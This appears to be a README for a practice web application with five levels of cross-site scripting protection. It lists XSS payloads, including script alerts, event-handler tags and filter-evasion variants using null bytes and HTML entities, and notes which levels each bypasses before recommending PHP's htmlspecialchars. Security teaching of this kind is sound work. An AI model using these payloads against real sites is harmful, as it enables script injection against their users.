# How to perform Cross Site Scripting Attack in this Site
There are different payloads you can use to perform different kind of attacks and show different types of results in all 5 levels of XSS Attacks in this site.

## Payloads to Display all Data in the table using Conditional Statement
### Types of XSS Attacks:
- **Payload for Reflexive XSS:** *`<script>alert(“Reflected XSS”);</script>`*
- **Payload for DOM Based XSS:** *`<script>document.body.style.backgroundColor=“red”;</script>`*
- **Stored XSS:** Open `XSS_level6.html`

### Payloads for different levels
1. The following payloads worked in the first level only since it had very basic security: 
- `<script>alert(123);</script>`
- `<script>alert("XSS");</script>`
- `<script>alert(123)</script>`
- `<script>alert("hellox worldss");</script>` 
- `<script>alert(“XSS”)</script>`
- `<script>alert(“XSS”);</script>`
- `<script>alert(“XSS”)</script>`
- `<script>alert(/XSS/)</script>` 
- `<script>document.body.style.backgroundColor="red";</script>`

2. The following payloads worked in the second level as well as the first level as `<script>` was removed so previous tags didn’t work:
- `<IMG SRC=jAVasCrIPt:alert(“XSS”)>`
- `<IMG SRC=javascript:alert(“XSS”);>`
- `<IMG SRC=javascript:alert(&quot;XSS&quot;)>`
- `<IMG SRC=javascript:alert(“XSS”)>`
- `<img src=xss onerror=alert(1)>`
- `<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>` 
- `<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'` 
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"` 
- `<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}` 
- `<audio src/onerror=alert(1)>`

3. The following payloads for second level also worked for third and fourth levels despite different security precautions taken:
- `<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>` 
- `<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'` 
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}` 
- `<audio src/onerror=alert(1)>`
- `<video src=1 onerror=alert(1)>`
- `<audio src=1 onerror=alert(1)>`

4. The final level (fifth level) prevents all kind of attacks and none of the payloads work as any kind of HTML scripts are removed.

5. While the fifth level stops the attack, a better method would be to use the `htmlspecialchars` function inbuilt in PHP.